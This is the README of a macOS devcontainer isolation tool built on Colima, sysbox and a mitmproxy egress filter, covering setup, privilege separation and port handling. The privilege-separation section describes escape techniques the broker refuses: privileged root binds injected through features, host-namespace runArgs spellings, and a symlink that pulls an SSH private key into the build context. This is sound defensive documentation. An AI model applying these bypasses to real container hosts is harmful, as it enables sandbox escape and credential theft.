# isolated-devcontainers-suede (`desolate`)

> [!NOTE]
> This is a [suede](https://github.com/pmalacho-mit/suede) dependency.

A browser-based, container-isolated VS Code dev environment for macOS.
You edit in a browser tab; each project runs in its own devcontainer
on an inner Docker daemon; that inner daemon runs **unprivileged** under the
[sysbox](https://github.com/nestybox/sysbox) runtime, so a compromised project
cannot reach the VM or your Mac. Hardened against the container-escape chain in
The Red Guild's ["Leveraging VSCode internals to escape containers."](https://blog.theredguild.org/leveraging-vscode-internals-to-escape-containers/).

The name is `desolate` = **de**v + i**solate**.

## Architecture

```
+- macOS ---------------------------------------------------------------+
|  browser --> 127.0.0.1:3000 (?token)     ./cli.sh observe (no port)   |
|                                                                       |
|  +- Colima VM (Ubuntu; sysbox + desolate-proxy) --------------------+   |
|  |  SECRETS LIVE HERE ONLY: /etc/desolate-proxy/settings.json (0600)  |   |
|  |  all container egress is force-redirected through the proxy      |   |
|  |  +- dind -- UNPRIVILEGED via sysbox-runc --------------------+  |   |
|  |  |  inner dockerd   <- devcontainers + relays live here      |  |   |
|  |  |   |- [orchestrator] --- HOLDS THE SOCKET; serves broker    |  |   |
|  |  |   |- [vscode: editor] -- NO socket; broker client only     |  |   |
|  |  |   \- devcontainer (your project)                          |  |   |
|  |  |        \- optional level-3 container (e.g. FastAPI)       |  |   |
|  |  +-----------------------------------------------------------+  |   |
|  +----------------------------------------------------------------+   |
|  Host /var/run/docker.sock: mounted NOWHERE                          |
+-----------------------------------------------------------------------+
```

**One** host-reachable surface, loopback-only: `3000` by default (`VSCODE_PORT`),
the editor, token-gated. (Plus the dev-server range, 8080-8090 by default, once a
project is running.)

There is deliberately no network path to the inner Docker daemon.

> [!NOTE]
> An earlier version published a GET-only socket proxy on `127.0.0.1:2375` for host-side
> observability; it was removed, because its read-only guarantee constrained only
> the Mac -- already the trust root, and able to drive the inner daemon through
> the orchestrator regardless -- while an unauthenticated HTTP port on loopback is
> reachable from any browser aimed at a hostile page (DNS rebinding), which a unix
> socket is not. `./cli.sh observe` replaces it.

## Requirements

- macOS 13+
- [Homebrew](https://brew.sh/)
- `brew install docker docker-compose colima jq`

`jq` is needed by `cli.sh observe inspect|raw` and by the static test suite.
`gh` is optional -- with it, `cli.sh repo add` registers deploy keys for you;
without it you paste the public key into GitHub yourself.

sysbox is what makes the whole thing safe, and it needs a real Linux kernel
(cgroup v2, id-mapped mounts). Colima's VM is a real Ubuntu machine, so sysbox
installs into it -- unlike Docker Desktop's sealed VM, where it cannot. (This
is why the setup is Colima-only.)

## Setup

### 0. Determine specs for the Colima VM

The VM you'll setup in the next step is meant to host your whole development workflow, so size it like your primary machine rather than a sandbox.

You'll need three numbers: `cpus` (how many CPU cores the VM gets), `memory` (how much RAM it gets, in GB), and `disk` (how much storage it gets, in GB, for images and project files).

Read your Mac's numbers first:

```bash
sysctl -n hw.logicalcpu                       # total cores
```

```bash
sysctl -n hw.perflevel0.logicalcpu            # performance cores (only Apple Silicon)
```

```bash
echo $(( $(sysctl -n hw.memsize) / 1073741824 ))   # RAM, GiB
```

```bash
df -h /System/Volumes/Data                    # free disk (where ~/.colima lives)
```

> [!WARNING]
> `hw.perflevel0.logicalcpu` errors on Intel Macs, which have no P/E split -- instead just use the total.

Based on those values, here's some guidance on what settings to use in the next step:

**`--cpus`: total cores minus 2.** Two cores left over keeps macOS responsive while the VM builds. On Apple Silicon, your performance-core count is a good conservative alternative -- it leaves the efficiency cores to the host, and on many systems it comes out to the same number anyway.

**`--memory`: half to two-thirds of your RAM.** This is the value that actually constrains you, since every open project is a devcontainer running a full VS Code server plus its toolchain. Keep <ins>**at least 8 GB**</ins> on the Mac side -- the editor UI is a _browser tab on the host_, so the browser's RAM usage comes out of the host's share, not the VM's.

**`--disk`: be generous, 100 GB+ if you can spare it.** Inner images, named volumes, and every devcontainer layer are stored here. The image grows on demand rather than pre-allocating, and Colima releases unused space back on startup, so a large number costs little until you use it. Keep roughly 20% of your Mac's disk free.

| Mac (cores / RAM) | `--cpus` | `--memory` | `--disk` |
| ----------------- | -------- | ---------- | -------- |
| 8 / 16 GB         | `6`      | `8`        | `100`    |
| 10 / 16 GB        | `8`      | `8`        | `100`    |
| 12 / 32 GB        | `10`     | `20`       | `150`    |
| 14 / 36 GB        | `12`     | `24`       | `200`    |
| 16 / 64 GB        | `14`     | `40`       | `250`    |

Don't overthink it -- all three can be changed later. Stop the VM and start it
again with new numbers; flags you leave out keep their current values:

```bash
colima stop desolate
colima start desolate --cpus 10 --memory 24 --disk 200
```

> [!WARNING]
> One limit: **disk can only grow.** Ask for less and Colima warns `disk size cannot be reduced, ignoring...` and keeps the size you had.

### 1. Create the Colima VM

Start the Colima VM (with the `desolate` name) using the below flags and tell `docker` to use it:

```bash
cd <path>/isolated-devcontainers-suede/
```

```bash
colima start desolate \
  --vm-type vz --vz-rosetta --mount-type virtiofs --mount "$PWD" \
  --cpus ___ --memory ___  --disk ___
```

```bash
docker context use colima-desolate
```

> [!IMPORTANT]
> Make sure to fill in the `___`s above with the numbers you determined in [step 0](#0-determine-specs-for-the-colima-vm).

| flag           | value                                               | what it does                                                               | Apple Silicon only |
| -------------- | --------------------------------------------------- | -------------------------------------------------------------------------- | ------------------ |
| `--cpus`       | from [step 0](#0-determine-specs-for-the-colima-vm) | CPU cores the VM gets                                                      | No                 |
| `--memory`     | from [step 0](#0-determine-specs-for-the-colima-vm) | RAM the VM gets, in GiB                                                    | No                 |
| `--disk`       | from [step 0](#0-determine-specs-for-the-colima-vm) | Storage the VM gets, in GiB                                                | No                 |
| `--vm-type`    | `vz`                                                | Use Apple's Virtualization framework instead of QEMU -- faster. macOS 13+. | No                 |
| `--vz-rosetta` | _(none)_                                            | Run amd64 images via Rosetta, so x86-only images still work                | **Yes**            |
| `--mount-type` | `virtiofs`                                          | Fastest way to share files with the VM. Requires `--vm-type vz`.           | No                 |
| `--mount`      | `"$PWD"`                                            | Share this repo with the VM -- and nothing else from your Mac              | No                 |

> [!NOTE]
> `--vm-type` and `--mount-type` are the two you can't change later, and would require a `colima delete desolate` followed by a fresh `colima start desolate ...`. Though you shouldn't need to change these, if you had to it wouldn't be a big deal, since [`colima delete`](https://colima.run/docs/commands/#colima-delete) preserves data by default, so you'd just need to re-[provision](#2-provision-the-vm) the VM after recreating it.

### 2. Provision the VM

Run the below command from your Mac. It `ssh`es into the VM and installs both VM-side layers ([sysbox](#1-sysbox) and the [egress proxy](#2-the-egress-proxy)):

```bash
./cli.sh vm install
```

> This assumes you're still `cd`ed into _isolated-devcontainers-suede/_ from the previous step. From anywhere else, use the full path: `<path>/isolated-devcontainers-suede/cli.sh vm install`.

**This runs scripts from the repo folder _inside_ the VM**, which works because [step 1](#1-create-the-colima-vm) started the VM with `--mount "$PWD"`. If that mount is missing or points somewhere else, the VM cannot see the scripts and will error (use `./cli.sh vm status` to check your setup).

Each script installs one of the two isolation layers the VM is built on:

#### 1. sysbox

Installed by [`vm/install-sysbox.sh`](./vm/install-sysbox.sh). This is the
containment boundary -- the reason a compromised project can't reach your Mac.

Normally, running Docker inside a container requires `--privileged`, which is
close to handing that container the machine. sysbox is a container runtime that
makes it unnecessary: it runs each container in its own **user namespace**, so
what the container calls "root" is really an unprivileged user on the VM. The
inner Docker daemon gets everything it needs to build and run your
devcontainers, while a break-out lands as a nobody user on the VM instead of as
root.

`cli.sh up` refuses to start until `docker info` lists `sysbox-runc`, so you
can't accidentally run the stack without this.

> [!NOTE]
> **The sysbox layer needs a container-free daemon.** Its installer restarts docker to rewrite network parameters and refuses to configure while _any_ container exists on the VM. `vm install` handles this by removing `desolate`'s own containers first, and refuses only if containers it does not own are left.

To pin a different sysbox release, check the
[releases page](https://github.com/nestybox/sysbox/releases) and pass it
through:

```bash
SYSBOX_VERSION=0.7.0 ./cli.sh vm install
```

#### 2. The egress proxy

Installed by [`proxy/vm/install.sh`](./proxy/vm/install.sh). "Egress" just means
traffic leaving your containers. This layer puts a checkpoint in front of all of
it.

The payoff is that **your real secrets never have to exist inside a container**.
Your project uses placeholders like `${GITHUB_TOKEN}`; the checkpoint swaps in
the real value as the request leaves the VM, and scrubs it back out of anything
that comes back. Code running in a devcontainer can _use_ your tokens without
ever being able to _read_ them (see [Secrets](#secrets-placeholders-in-real-values-never)).

The checkpoint is [mitmproxy](https://mitmproxy.org/) -- a tool that sits in the
middle of a network connection and can inspect or rewrite what passes through.
That is normally an attack ("man in the middle"); here you are doing it to your
own traffic, on purpose. It runs in **transparent mode**, meaning containers
need no proxy settings at all: they make ordinary requests, and the VM's
firewall quietly reroutes them.

Four pieces get installed:

| piece          | where    | what it's for                                                                       |
| -------------- | -------- | ----------------------------------------------------------------------------------- |
| mitmproxy      | `:18080` | The checkpoint itself -- swaps secrets in, scrubs them out, blocks disallowed hosts |
| DNS resolver   | `:5353`  | Answers containers' domain lookups, so name resolution can't be used to slip past   |
| CA publisher   | `:18081` | Hands out the proxy's certificate, so containers can trust it for HTTPS             |
| nftables rules | kernel   | Force all container traffic through the above, rather than trusting them to opt in  |

The certificate matters more than it sounds: HTTPS traffic is encrypted, so the
proxy can only do its job if containers trust its certificate. That's what the
publisher is for, and it's why a devcontainer that skips installing the CA gets
TLS errors.

Your own dev servers (ports 8080-8090 by default) are deliberately left out of
all this -- that range belongs to your projects.

> [!NOTE]
> `./cli.sh up` may re-run the proxy installation by invoking `cli.sh vm install` with the `--proxy-only` flag. The firewall rules are tied to the name of the network the stack runs on, and that name can change out from under them -- which would turn interception off silently. So `up` checks on every start and repairs it if needed (see [Why `up` re-checks the proxy](#why-up-re-checks-the-proxy)). `--proxy-only` skips the sysbox half, which restarts docker and would kill the stack that just started.

### 3. Start the stack

First give the editor a password. `VSCODE_TOKEN` is a random string that gets
added to the editor's URL, and it is the only thing standing between your
projects and anything else that can reach `127.0.0.1:3000` on your Mac -- the
editor can read and write every project in `/workspaces`, so this is not
optional. `cli.sh up` refuses to start without it.

```bash
echo "VSCODE_TOKEN=$(openssl rand -hex 24)" >> .env && chmod 600 .env
./cli.sh up            # verifies sysbox, builds, starts, runs preflight,
                       # then prints (and copies) the editor URL
```

> [!WARNING]
> `>>` **appends** to `.env` if it already exists. The last value will be used, so it's not a big deal, but your `.env` will grow indefinitely.

Open the printed `http://127.0.0.1:3000/?tkn=...` URL. That's your editor.

[`preflight`](./preflight.sh) will tell you whether egress is actually intercepted. To see the
secrets machinery work end to end:

```bash
./cli.sh proxy test     # substitution + scrubbing, then a blocked exfil (403)
```

### Why `up` re-checks the proxy

The firewall rules that force container traffic through the proxy refer to the
stack's network **by name**. If that name ever changes, the rules keep loading
without complaint and simply stop matching anything -- no error, no failed
request, just containers quietly talking to the internet unfiltered.

Because that failure is invisible, `cli.sh up` never assumes it worked. On every
start it checks that the rules are armed for the network the stack actually
landed on, and repairs them if not:

```
cli.sh: egress interception needs attention -- rules are armed for
        'br-desolate' but the editor bridge is 'br-a1b2c3d4e5f6'.
cli.sh: re-provisioning the VM proxy layer...
```

If it can't turn interception on, `up` **fails** rather than leave your
containers running with unfiltered network access. You can override that with
`DESOLATE_SKIP_VM_CHECK=1`, but it doesn't repair anything -- it only stops `up`
refusing.

You may also see a warning about an "unpinned" network. Run
`./cli.sh down && ./cli.sh up` to recreate it, which fixes it for good.

<details>
<summary>How the name drifts, for the curious</summary>

The nftables rules match on an interface _name_ (`iifname $DESOLATE_IF`). That
name is pinned in `docker-compose.yml` via
`com.docker.network.bridge.name: br-desolate`, so it survives a `down`/`up`.

The pin has one gap, and it is a silent one. `driver_opts` are applied when the
network is **created**, so a network that already existed before the pin was
added keeps docker's generated `br-<hash>` name. Rules armed for `br-desolate`
still load cleanly -- `iifname` is a string match, so nftables happily accepts a
name no interface currently has -- and then match nothing.

So `cli.sh up` does not trust the pin. After compose returns it resolves the
bridge the network is _actually_ on (via the gateway address), compares that
against the `DESOLATE_IF` the installed ruleset is armed for, and also checks
that the ruleset is loaded and the three units are active. If any of that is
wrong it re-runs the proxy layer with `--proxy-only` -- the sysbox layer
restarts docker and would kill the stack that just started.

An unpinned network keeps warning because its name changes on every recreate, so
the rules would go stale again each time.

</details>

## Daily use

```bash
./cli.sh up                     # start (idempotent); prints the editor URL
./cli.sh url                    # reprint + copy the editor URL to clipboard
./cli.sh desolate <project>     # open a workspace project as an isolated IDE
./cli.sh secret add NAME --hosts a.com   # store a real value in the VM only
./cli.sh secret list | rm NAME
./cli.sh proxy status | logs | test      # egress proxy health + self-test
./cli.sh vm status              # sysbox, live vs armed bridge, VM unit state
./cli.sh vm install             # re-provision the VM (idempotent; also upgrades)
./cli.sh repo add owner/repo    # per-repo deploy key (in-container) + clone
                                # -> /workspaces/owner/repo
./cli.sh desolate owner/repo    # open it
./cli.sh shell                  # bash in the editor container
./cli.sh ps | logs | preflight | observe
./cli.sh down                   # stop (down -v also deletes volumes; confirms)
```

**Getting code in and out:** use the browser editor directly -- drag a folder
into the file explorer to add it, and right-click -> Download to pull files
out. There is no separate copy tool.

## Privilege separation (why the editor can't touch the daemon)

The editor is a **universal file viewer/editor** over `/workspaces` -- you can
read, edit, add and delete files in any project from the `:3000` tab. What it
deliberately does _not_ have is Docker access: no socket mount, no
`DOCKER_HOST`. Only the **orchestrator** container holds the inner daemon
socket.

To start a devcontainer, the editor's `desolate` command sends a request over a
unix socket to the orchestrator's **broker**, which accepts a fixed vocabulary
and nothing else:

```
desolate <project>            ->  {"op":"start","project":"..."}
desolate --rebuild <project>  ->  {"op":"rebuild", ...}
desolate --stop <project>     ->  {"op":"stop", ...}
desolate --ports <project>    ->  {"op":"ports", ...}
desolate --list               ->  {"op":"list"}
```

`rebuild` runs the _same_ snapshot-resolve-enforce sequence as `start`, never a
shortcut around it. It is the op most likely to be used immediately after
editing `devcontainer.json` -- precisely when the spec is newly hostile -- so
letting it reuse an older validation would make "edit the spec, then rebuild"
the way past the policy.

So a malicious VS Code extension in the editor cannot create containers, mount
volumes, or exec into siblings -- the API simply has no such verb.

**The broker also validates the spec, and that part is load-bearing.** The
editor can edit `devcontainer.json`, so a narrow op vocabulary alone would be
theater: a hostile extension could write
`"mounts": ["source=otherproject-secrets,..."]` into its own project and then
ask us to start it.

Getting that check _right_ is harder than it looks, because a devcontainer's
privilege can arrive from four places, and only one of them is the top-level
keys of the file you are reading. Five bypasses were demonstrated against an
earlier version of this policy; each now has a named regression test in
`tests/` (`E1`..`E5`). The rules, and what each is actually defending:

- **`initializeCommand` is refused.** It runs on the machine driving the
  devcontainer CLI -- the _orchestrator_, which holds the inner daemon socket.
  It was arbitrary code execution against exactly the daemon the editor is not
  allowed to touch. The in-container hooks (`postCreateCommand`,
  `onCreateCommand`, `postStartCommand`, ...) run inside your container and
  stay allowed.
- **`dockerComposeFile` is refused.** A compose-mode devcontainer declares its
  privilege in the compose file, which this policy does not read; `privileged`,
  `pid: host`, `network_mode: host` and `- /:/host` are all expressible there.
  Run compose _inside_ a devcontainer with the docker-in-docker feature instead.
- **Policy is enforced on the CLI's own `mergedConfiguration`**, not on our
  parse of the file. That is where a _feature_'s `privileged` / `capAdd` /
  `securityOpt` / `mounts` land -- a local `./myfeature` could otherwise inject
  `--privileged --mount type=bind,src=/,dst=/host` without the project's
  devcontainer.json mentioning any of it. It also removes the class of bug
  where our parser and the CLI's disagree about what the file says.
- **Mounts must be volumes** named `<project>` or `<project>-*`, checked over
  the merged list. The one exception is the read-only public-CA bind.
- **`runArgs` is an allowlist**, not a denylist. A denylist has to enumerate
  every spelling docker accepts, and it did not: `--network=host` was refused
  while `--network host`, `--net=host`, `--pid=container:<id>`, `--uts=host`
  and `--cgroupns=host` all sailed through. Unknown flags are now refused.
- **`workspaceMount`**, if present, must bind exactly this project's own folder.
- **`appPort` is refused** (it collides with the relay bind).
- **Privilege must be opted into explicitly**, in the project's own file:
  `"customizations": {"desolate": {"allowPrivileged": true}}`. The
  docker-in-docker feature needs it; the point is that it can no longer be
  inherited _silently_ from a third-party feature, and that `git log` shows
  which projects are in the escalated tier.

The validated spec is then **snapshotted** to a directory only the orchestrator
can write, and the container is started from that copy (`--override-config`).
Without it the editor could swap the file between the check and the start, and
the check would be decorative.

Snapshotting the whole `.devcontainer/` directory means **following its
symlinks**, and that happens in the orchestrator -- the one container holding
the inner Docker socket. So every link must resolve to somewhere inside the
project:

```
myproject/.devcontainer/key -> ../../../root/.ssh/id_ed25519   # refused
myproject/.devcontainer/Dockerfile -> ../Dockerfile            # fine
```

The first is not a policy question -- every key in that project's
devcontainer.json is legal. It is a file read performed by the orchestrator on
the project's behalf, landing in the build context, where a `COPY key /` in the
project's own Dockerfile collects it. Links that stay inside the project are
still dereferenced, so the snapshot holds real files rather than paths back
into editor-writable state. A link to a *sibling project* is refused too: that
is someone else's trust domain.

`preflight.sh` asserts the separation holds: the editor must _fail_ to reach a
daemon, must not mount the socket volume, and the broker socket must be
present. `tests/integration/stack` goes further and runs the attacks from
inside the editor container.

**Known limit:** a project that uses the docker-in-docker feature is privileged
_within the sysbox userns_ on the inner daemon, so within one stack it remains
possible for such a project, if compromised, to reach sibling containers'
on-disk data. The broker cannot fix that -- it can only make you write the
opt-in down. Run genuinely untrusted code in a separate stack (trust tier), not
just a separate project.

**Also unfixed by the broker:** all devcontainers share the inner daemon's
default bridge with `icc=true`, so they can reach each other over the network
even though they cannot read each other's files. Per-project networks would
close that; today it is a real gap in "each devcontainer is truly sandboxed".

That gap is deliberately bounded, though, and the boundary is the one that
matters: devcontainers may reach *each other*, but not the editor. dind sits on
its own bridge (`dindnet`/`br-desolate-in`), the editor and orchestrator on
`devnet`/`br-desolate`, and the VM's forward chain drops between the two before
its established-state accept. The split is what makes that drop reliable -- on
one shared bridge the traffic was *bridged*, so the chain only saw it while
`br_netfilter` was passing frames to the inet hooks, and nothing asserted that.
Had it ever been off, the wall would have been gone with every other check in
`preflight.sh` still green, because egress to the internet is routed and stays
filtered either way. `preflight.sh` section 5b now probes the path directly,
and `tests/integration/stack` runs the same probes from inside a devcontainer.

One consequence worth knowing: **git over SSH is the editor's alone.** The
`:22` allowlist accept is scoped to `$DESOLATE_IF`, so a devcontainer cannot
open an SSH connection anywhere. Deploy keys are minted and used in the editor;
a project that somehow obtained one still has no route out to use it. Projects
that fetch dependencies over `git+ssh` (private Go modules, npm git deps,
submodules) must use HTTPS instead -- which goes through the proxy, where a
token can be a substituted placeholder.

**The proxy is the other half of the wall.** `:80` and `:443` are REDIRECTed to
it before the forward chain ever runs, so the drops above never see them, and it
then dials onward from the VM where no bridge rule applies. `addon.py`
therefore refuses any request whose destination *address* is internal -- private,
shared (`100.64.0.0/10`), loopback, link-local, multicast or reserved -- before
the network policy is consulted at all. The policy could not close this itself:
it matches names, an IP literal matches `*`, and a public name whose A record
points inside satisfies any allowlist.

Override with `"allow_private_destinations": true` only if you are deliberately
proxying to the LAN, and note that it is all-or-nothing: it also re-opens
loopback, the cloud metadata endpoint, and devcontainer-to-editor on those two
ports.

One hole remains open by construction: `tls_passthrough` globs are tunnelled
from `tls_clienthello` and never reach the destination check, and the SNI they
match on is chosen by the client. Every entry added there is a way to reach an
internal address on `:443`. It ships empty.

## Dev servers and dynamic ports

A project declares the **container-side** ports it serves, in its
`devcontainer.json` (never host ports -- those are machine-specific and would
collide):

```json
"customizations": { "desolate": { "ports": [5173] } }
```

`desolate` allocates a free host port from **8080-8090** at start, remembers it
per project (stable URLs across restarts), and forwards it via a socat relay.
Start your dev server bound to `0.0.0.0` (e.g. `npx vite --host 0.0.0.0`); the
URL `desolate` printed answers once the server is up. Do **not** put `appPort`
in devcontainer.json -- `desolate` hard-fails on it, because it collides with
the relay's port bind.

Each project spends one port on its editor plus one per declared port, so the
default range holds roughly five or six projects at once.

### Features and build-time downloads

Devcontainer Features work normally, including ones that fetch over HTTPS during
the build. That needs explaining, because it is not free: build steps run in
containers made from your **base image**, which does not trust the intercepting
proxy's CA, so a Feature curling an installer would fail certificate
verification.

So `desolate` derives one for you. Before starting a project it builds a thin
image from your base with the CA installed, tags it
`desolate-ca/base:<hash>`, and starts the project from that. It happens once per
base image, is cached in the inner daemon afterwards, and nothing about it
bypasses the proxy -- the build just trusts it like every other container does.

**Projects that build from their own `Dockerfile` are not covered.** The `FROM`
is yours, so `desolate` cannot derive it; build-time HTTPS in such a project
still fails certificate verification, and `desolate` says so explicitly when it
sees one rather than letting you discover it mid-build.

The supported path is `"image"` plus Features, which covers most of what a
Dockerfile is usually doing anyway. If you genuinely need a custom Dockerfile,
either pre-build that image yourself outside the stack and reference it with
`"image"`, or keep its build steps to plain-http sources (`apt` already is).

## Building your own containers inside a devcontainer

If your project runs its own containers -- a `compose.yml` you bring up from
inside the devcontainer, testing something production-shaped -- those builds hit
the same wall, one level further down.

### Why

Every container's egress is redirected through the proxy, which presents
certificates signed by a private CA. **A container trusts CAs from its own
image's filesystem**, so a stock `python:3.12-slim` does not trust the proxy,
and anything it fetches over HTTPS during `docker build` fails:

```
fatal: unable to access 'https://...': SSL certificate problem:
       unable to get local issuer certificate
```

Nothing at the daemon or host level can fix this. `pip`, `npm` and `git` are
each their own TLS client with their own trust store, verifying inside a
throwaway build container. The only thing that reaches all of them at once is
**the base image's trust store**.

Note this is specifically HTTPS _inside a build step_. Plain-http `apt` works
untouched, which is why the problem often does not show up until the first
`pip install`.

### The fix

Derive a base image that trusts the proxy, and redirect the build's `FROM` at
it. `desolate` publishes a script into every devcontainer for this -- run it
from **your own terminal inside the devcontainer**:

```bash
/desolate-ca/trust-proxy-in-builds.sh --service api --image python:3.12-slim
```

That does two things:

1. Builds `desolate-ca/python:3.12-slim` on your devcontainer's own daemon --
   your base, plus the CA, plus the environment variables below.
2. Writes `compose.override.yml` next to your `compose.yml`, pointing that
   service's build at the derived image, and adds the file to `.gitignore`.

Then build as usual. **Your `Dockerfile` and `compose.yml` are never touched.**

It fixes **runtime as well as build time**, which is worth knowing because it is
not obvious. Installing the CA into the system trust store is not enough on its
own: Python (`httpx`, `requests`, `pip`), Node and Cargo all ignore the system
store and carry their own bundled CA list. An app doing outbound HTTPS would
still fail with:

```
[SSL: CERTIFICATE_VERIFY_FAILED] unable to get local issuer certificate
```

So the derived image also sets `SSL_CERT_FILE`, `REQUESTS_CA_BUNDLE`,
`NODE_EXTRA_CA_CERTS`, `CARGO_HTTP_CAINFO` and `GIT_SSL_CAINFO` as image `ENV`,
pointing at the system bundle -- which now holds the proxy CA _and_ every public
root. As `ENV` they reach every process; the same variables written to
`/etc/profile.d` would only reach login shells, never a container that execs
`uvicorn`. Because they name the standard bundle path, they are harmless in an
image built outside desolate.

```bash
docker compose up --build
```

Run it once per (service, base image). Later invocations merge into the same
file rather than replacing it, so a second service or a second base image just
adds an entry. Useful flags:

| Flag                            | Effect                                                            |
| ------------------------------- | ----------------------------------------------------------------- |
| `--compose <file>`              | point at a compose file elsewhere; the override is named to match |
| `--image` alone, no `--service` | just derive the image and print the YAML to add                   |
| `--print-recipe`                | show the Dockerfile it _would_ build, then stop                   |
| `--force`                       | rebuild even if the derived image is current                      |
| `--no-gitignore`                | leave `.gitignore` alone                                          |

**It shows you the recipe before it runs.** This script modifies the image your
code is built from, on your behalf, so it prints the complete Dockerfile it uses
-- there is no second file and no hidden step:

```
trust-proxy: deriving desolate-ca/python:3.12-slim
             from python:3.12-slim, using exactly this and nothing else:

    | FROM python:3.12-slim
    | USER root
    | COPY ca.pem /usr/local/share/ca-certificates/desolate-proxy.crt
    | COPY ca.pem /etc/pki/ca-trust/source/anchors/desolate-proxy.crt
    | RUN set -eu; \
    |     if command -v update-ca-certificates >/dev/null 2>&1; then update-ca-certificates; \
    |     elif command -v update-ca-trust >/dev/null 2>&1; then update-ca-trust extract; \
    |     else echo '... has neither ...' >&2; exit 1; fi
    | ENV SSL_CERT_FILE=/etc/ssl/certs/ca-certificates.crt
    | ENV REQUESTS_CA_BUNDLE=/etc/ssl/certs/ca-certificates.crt
    | ENV CARGO_HTTP_CAINFO=/etc/ssl/certs/ca-certificates.crt
    | ENV GIT_SSL_CAINFO=/etc/ssl/certs/ca-certificates.crt
    | ENV NODE_EXTRA_CA_CERTS=/usr/local/share/ca-certificates/desolate-proxy.crt
    | LABEL desolate.ca.fingerprint=<sha256 of the CA>
    | USER vscode

             build context: /desolate-ca  (contains only the public CA cert)
```

Use `--print-recipe` to read it _before_ anything is built. The recipe is shown
only when it actually derives; a cached rebuild stays quiet.

### What this means for production

`compose.override.yml` is a **development artifact and must not ship.** Compose
auto-merges it only when it sits beside your compose file, so:

|                                     | In the devcontainer                    | In production               |
| ----------------------------------- | -------------------------------------- | --------------------------- |
| Command                             | `docker compose up --build`            | `docker compose up --build` |
| Files read                          | `compose.yml` + `compose.override.yml` | `compose.yml`               |
| `FROM python:3.12-slim` resolves to | `desolate-ca/python:3.12-slim`         | `python:3.12-slim`          |

Identical command, unmodified `Dockerfile`, and nothing desolate-specific in
what you deploy. It is gitignored by default because if it _does_ reach
production, builds fail -- the `desolate-ca/*` images exist only inside your
devcontainer.

One caveat worth knowing: your development image is not byte-identical to the
production one. It carries one extra layer (the CA plus
`update-ca-certificates`). Everything above it is the same.

### Two things that will bite

- **Do not pass `--pull`.** It makes BuildKit try to fetch `desolate-ca/*` from
  a registry, where it does not exist, and the build fails with `pull access
denied`. Loud, at least.
- **A new base image needs its own run.** Adding a service on `node:22-slim`
  means running the script again for it; the build otherwise fails with the
  certificate error above, naming the image.

If you would rather keep all of this out of your project entirely, reference a
**pre-built image** (`image: myapp:dev`) instead of building in place. Nothing
needs deriving, and it is closer to what production actually does.

### Applying changes to devcontainer.json

```bash
desolate --rebuild <project>              # recreate the container from the current spec
desolate --rebuild --no-cache <project>   # and rebuild the image ignoring layer cache
```

**Starting a project reuses its existing container.** `devcontainer up` finds
the container by label and starts it; it never re-reads `devcontainer.json`. So
the obvious cycle -- edit the spec, `--stop`, start again -- gives you the old
container back, and `--stop` deliberately keeps the container so restarts stay
fast. `--rebuild` is what applies a spec change.

You should not have to remember this: `desolate` fingerprints the whole
`.devcontainer/` tree when it creates a container and compares on every start,
so an edit that is not in effect is reported rather than silently ignored. A
`Dockerfile` or `postCreate` script edit counts the same as a `devcontainer.json`
one.

Rebuilding is never automatic, because it destroys anything written inside the
container outside `/workspaces` -- packages installed ad hoc, a local database.
`/workspaces` itself is a volume and survives.

### Changing the range

8080-8090 is the default, not a constant. Set both bounds in the `.env` next to
`docker-compose.yml` and restart:

```bash
DESOLATE_PORT_MIN=8080
DESOLATE_PORT_MAX=8120
```

```bash
./cli.sh up          # recreates dind (the publish) and the orchestrator (the allocator)
```

Set **both** variables, and change them only here. They feed two places that
have to agree: the range dind publishes to the Mac, and the range `desolate`
allocates relays from. Of the two ways to get that wrong, only one is loud --
publishing more than you allocate merely wastes port bindings, while allocating
more than you publish produces a relay that binds happily inside dind and is
simply unreachable from the Mac, so the URL never answers and nothing logs an
error. Driving both from one pair of variables is what prevents that;
`cli.sh preflight` re-checks it against the _running_ containers, which is the
case config alone cannot catch (an `.env` edit without a restart).

### When the range runs out

There is no queue and no overflow range: `desolate <project>` stops with a
listing of every port in the range and what holds it, and does nothing else.
Allocation happens before `devcontainer up`, so a refusal leaves nothing
half-started and does not disturb the port maps of projects already running.

The usual cause is simply too many projects at once -- `desolate --stop <other>`
frees a port immediately. The other cause is worth knowing: relay containers run
with `restart: unless-stopped`, so if a project's devcontainer is deleted by
hand rather than through `desolate --stop`, its relays survive and keep holding
their ports. `./cli.sh observe ps` lists them as `desolate-relay-<project>-<port>`.

## How projects are laid out

A project is a directory under `/workspaces`, and may be nested **one** level so
repositories are scoped by owner:

```
/workspaces/
  example-project/            <- a flat project
  pmalacho-mit/               <- an owner directory, not a project itself
    typescript2mermaid-suede/ <- a project
```

`cli.sh repo add owner/repo` clones to `/workspaces/owner/repo`, and you open it
with the same two-part name:

```bash
./cli.sh desolate pmalacho-mit/typescript2mermaid-suede
```

Two owners can then have a repo of the same name without colliding -- and so can
their deploy keys, which are named `deploy_<owner>__<repo>` for the same reason.

Exactly one level of nesting is allowed. `a/b/c` is refused, and so is anything
resolving outside `/workspaces` -- the broker compares the _resolved_ path
against the workspaces root, so a symlink named legally still cannot escape.

**Docker names cannot contain `/`.** So a nested project's volumes, relay
containers and state files use an encoded form: `owner/repo` becomes
`owner__repo`, and the project owns the `owner__repo-*` volume namespace. You
only see this if you look at `docker volume ls` or write a `mounts` entry by
hand -- `desolate` and the broker's policy use the same encoding, so a project
can always mount its own.

**Inside the container, the path mirrors the path outside.** A nested project
opens at `/workspaces/owner/repo`, the same path it has in `/workspaces`, so two
owners' same-named repos are told apart at a glance rather than both showing up
as `/workspaces/repo`.

That is not the devcontainer CLI's default. The CLI derives the in-container path
from `${localWorkspaceFolderBasename}`, which is the **last path segment only**,
so it would mount `/workspaces/pmalacho-mit/suede` at `/workspaces/suede`.
`desolate` sets `workspaceFolder` and `workspaceMount` together to mirror the
outer path instead -- together, because setting `workspaceFolder` alone leaves the
CLI deriving the mount target from the basename, which mounts the workspace in one
place and tells the editor to open another. A project that declares either field
itself keeps full control and is left alone.

Containers created before this behaviour existed keep the layout they were built
with (`devcontainer up` reuses a container without remounting it). `desolate`
prints the actual in-container path and points you at `--rebuild`.

⚠️ **`${localWorkspaceFolderBasename}` drops the owner in `mounts` too**, and there
the policy refuses the result. The idiom from Microsoft's docs --

```jsonc
"mounts": ["source=${localWorkspaceFolderBasename}-node_modules,target=...,type=volume"]
```

-- expands to `suede-node_modules` for `pmalacho-mit/suede`, which is outside that
project's namespace. Refusing is the point: two owners' `suede` repos would
otherwise share one volume. Name it explicitly instead:

```jsonc
"mounts": ["source=pmalacho-mit__suede-node_modules,target=...,type=volume"]
```

The error message says this, including the exact name to use.

## Secrets: placeholders in, real values never

